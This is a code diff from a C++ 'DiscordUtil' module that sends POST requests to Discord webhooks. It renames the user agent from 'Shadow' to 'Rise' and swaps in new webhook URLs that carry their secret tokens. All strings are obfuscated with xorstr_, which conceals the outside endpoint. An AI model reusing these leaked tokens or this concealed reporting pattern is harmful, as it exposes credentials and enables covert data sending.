@@ -194,7 +194,7 @@ namespace DiscordUtil {
             delete[] cpUCS2;
             return oRet;
             };
-        HINTERNET hSession = WinHttpOpen(toWide(xorstr_("Shadow/1.0")).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        HINTERNET hSession = WinHttpOpen(toWide(xorstr_("Rise/1.0")).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
         HINTERNET hConnect = WinHttpConnect(hSession, toWide(xorstr_("discord.com")).c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
         HINTERNET hRequest = WinHttpOpenRequest(hConnect, toWide(xorstr_("POST")).c_str(), toWide(xorstr_("/api/webhooks/1235253532802945024/lWa4cLNQib4ynRC80OdkrUblS7caeC_OBtjr-EcGevNlH2AQ1eSIcAFFa9045mu1vxEz")).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
         std::string request_body = xorstr_("{\"username\":\"") + username + xorstr_(" \",\"content\":\"") + message + xorstr_("\", \"avatar_url\":\"") + avatarURL + xorstr_("\"}");
@@ -214,7 +214,7 @@ namespace DiscordUtil {
             delete[] cpUCS2;
             return oRet;
             };
-        HINTERNET hSession = WinHttpOpen(toWide(xorstr_("Shadow/1.0")).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        HINTERNET hSession = WinHttpOpen(toWide(xorstr_("Rise/1.0")).c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
         HINTERNET hConnect = WinHttpConnect(hSession, toWide(xorstr_("discord.com")).c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
         HINTERNET hRequest = WinHttpOpenRequest(hConnect, toWide(xorstr_("POST")).c_str(), toWide(xorstr_("/api/webhooks/1241712894408659005/OBqcSv48GpuEDjVrk3Ifgo5TodzZFYaqbmRMnF5yOEUnUbnM7Ed9cBzNC4ACub-0_gKX")).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
         std::string request_body = xorstr_("{\"username\":\"") + username + xorstr_(" \",\"content\":\"") + message + xorstr_("\", \"avatar_url\":\"") + avatarURL + xorstr_("\"}");
